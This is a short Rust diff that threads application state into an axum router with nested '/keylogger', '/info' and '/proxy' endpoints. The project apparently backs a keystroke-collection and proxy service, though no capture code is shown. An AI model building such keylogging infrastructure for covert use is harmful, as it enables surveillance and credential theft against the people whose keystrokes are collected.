@@ -19,12 +19,12 @@ pub use proxy::proxy;
 
 use crate::AppState;
 
-pub fn public_endpoints() -> Router<AppState> {
+pub fn public_endpoints(state: &AppState) -> Router<AppState> {
     Router::new()
         .route("/ping", get(get_ping))
-        .nest("/keylogger", keylogger())
-        .nest("/info", info())
-        .nest("/proxy", proxy())
+        .nest("/keylogger", keylogger(state))
+        .nest("/info", info(state))
+        .nest("/proxy", proxy(state))
         .merge(SwaggerUi::new("/swagger").url("/api-docs/openapi.json", ApiDoc::openapi()))
     // .route(
     //     "/swagger",
